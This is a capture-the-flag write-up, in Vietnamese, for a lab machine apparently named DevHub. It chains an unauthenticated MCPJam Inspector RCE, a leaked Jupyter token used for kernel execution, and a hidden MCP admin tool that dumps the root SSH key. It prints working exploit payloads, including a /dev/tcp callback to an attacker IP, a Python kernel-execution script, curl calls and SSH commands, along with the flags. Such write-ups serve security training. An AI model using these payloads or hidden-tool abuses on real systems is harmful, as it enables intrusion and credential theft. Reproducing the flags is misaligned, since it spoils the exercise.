# DevHub

<figure><img src="../../.gitbook/assets/image (841).png" alt=""><figcaption></figcaption></figure>

## RECON

### Port Scan



```bash
(base) ┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.9.248 -r0-65400 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.9.248:22
Open 10.129.9.248:80
Open 10.129.9.248:6274
```



```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 00:47:50 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 00:47:51 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=5/30%Time=6A1B8535%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sun,\x2031\x20May\x202026\
SF:x2000:47:50\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x2
SF:02026\x2000:47:51\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x202026\x2000:47:51\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   273.34 ms 10.10.14.1
2   273.01 ms 10.129.9.248

```

Sau khi chạy nmap, ta có 3 port mở: `22` (SSH), `80` (nginx — redirect tới DevHub landing page), và `6274` — **MCPJam Inspector**.



<figure><img src="../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>











#### Service Details

```bash
$ curl -sS http://10.129.9.248:6274/
<!doctype html>
<html lang="en">
  <head>
    <title>MCPJam Inspector</title>
    <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
  </head>
```

Trang `devhub.htb` (port 80) cho biết MCP Inspector đang chạy active trên port `6274`.

#### CVE-2026-23744 — MCPJam Inspector RCE

<figure><img src="../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>

Tra cứu CVE cho thấy đây là lỗ hổng **Remote Code Execution chưa xác thực** trong MCPJam Inspector <= 1.4.2. Máy chủ HTTP bind `0.0.0.0:6274` thay vì `127.0.0.1`, endpoint `/api/mcp/connect` không yêu cầu auth. Attacker gửi `serverConfig.command` để thực thi lệnh.

### RCE — Remote Code Execution

#### Confirm Execution

Dùng `/dev/tcp` callback:

<figure><img src="../../.gitbook/assets/image (845).png" alt=""><figcaption></figcaption></figure>



RCE confirmed — user `mcp-dev`.

#### Payload

```json
POST /api/mcp/connect
Content-Type: application/json

{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-c", "id >/dev/tcp/10.10.14.205/4444"],
    "env": {"PATH": "..."}
  },
  "serverId": "rce"
}
```

### Lateral Movement — analyst



```bash
ps -aux
```

<figure><img src="../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>

#### Jupyter Token Leak

Từ output `ps auxww`:

```bash
analyst    1072  /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password= \
  --ServerApp.disable_check_xsrf=False
```

Jupyter Lab của user `analyst` chạy trên `127.0.0.1:8888`, token lộ rõ.

#### Kernel Execution via WebSocket

Dùng REST API tạo kernel + WebSocket để thực thi code dưới user analyst:

```bash
$ python3 - <<'PY'
import json, os, socket, struct, urllib.request

TOKEN = 'a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
HOST, PORT = '127.0.0.1', 8888

def http_json(method, path, data=None):
    url = f'http://{HOST}:{PORT}{path}&token={TOKEN}' if '?' in path \
          else f'http://{HOST}:{PORT}{path}?token={TOKEN}'
    body = None if data is None else json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header('Content-Type', 'application/json')
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())

kid = http_json('POST', '/api/kernels', {"name": "python3"})['id']
raw_key = __import__('base64').b64encode(os.urandom(16)).decode()

s = socket.create_connection((HOST, PORT), timeout=10)
ws_path = f'/api/kernels/{kid}/channels?session_id=pwn&token={TOKEN}'
req = (f'GET {ws_path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nUpgrade: websocket\r\n'
       'Connection: Upgrade\r\n'
       f'Sec-WebSocket-Key: {raw_key}\r\n'
       'Sec-WebSocket-Version: 13\r\n\r\n')
s.sendall(req.encode())
s.recv(4096)

# Gửi execute_request
code = """import subprocess
r = subprocess.run('cat /home/analyst/user.txt', shell=True, capture_output=True, text=True)
print(r.stdout)"""
msg = {"header":{"msg_id":"1","username":"x","session":"pwn","msg_type":"execute_request","version":"5.3"},
       "parent_header":{},"metadata":{},
       "content":{"code":code,"silent":False,"store_history":False,"user_expressions":{},"allow_stdin":False},
       "channel":"shell"}
# (WebSocket frame + send logic)
# (Recv + parse output)
PY
```

Output nhận được:

```
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
devhub
f8b40dca9a1d88258bc6d839a837c657
```

#### Flag user

```
f8b40dca9a1d88258bc6d839a837c657
```

#### Phát hiện OPSMCP

Đọc thêm từ analyst:

```bash
$ cat /opt/opsmcp/server.py
#!/usr/bin/env python3
"""OPSMCP - Operations MCP Server"""

VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

VISIBLE_TOOLS = {
    "ops.system_status": {},
    "ops.list_services": {},
    "ops.check_disk": {},
    "ops.view_logs": {}
}

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {}
}
```

Flask API chạy trên `127.0.0.1:5000`, hidden tool `ops._admin_dump` có thể dump `/root/.ssh/id_rsa`.

***

### Privilege Escalation — root

#### Gọi hidden tool dump SSH key

Dùng RCE từ mcp-dev gọi local OPSMCP:

```bash
$ curl -sS -X POST http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  --data '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Response:

```json
{
  "target": "ssh_keys",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA...",
  "note": "Emergency recovery key dump"
}
```

#### SSH với root key

```bash
$ chmod 600 devhub_root_key
$ ssh -i devhub_root_key -o StrictHostKeyChecking=no root@10.129.9.248
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devhub:~# cat /root/root.txt
5e37249a0097970acb9be31a9594c432
```

#### Flag root

```
5e37249a0097970acb9be31a9594c432
```

### Summary

| Step | Vector                                                              | Result                      |
| ---- | ------------------------------------------------------------------- | --------------------------- |
| 1    | CVE-2026-23744 — MCPJam Inspector unauth RCE qua `/api/mcp/connect` | Shell `mcp-dev`             |
| 2    | Jupyter token leak trong `ps auxww` → WebSocket kernel execution    | Shell `analyst` + user flag |
| 3    | Phát hiện hidden tool `ops._admin_dump` trong OPSMCP Flask API      | Dump root SSH private key   |
| 4    | SSH với root key                                                    | Root shell + root flag      |

**Flags:**

* **User**: `f8b40dca9a1d88258bc6d839a837c657`
* **Root**: `5e37249a0097970acb9be31a9594c432`











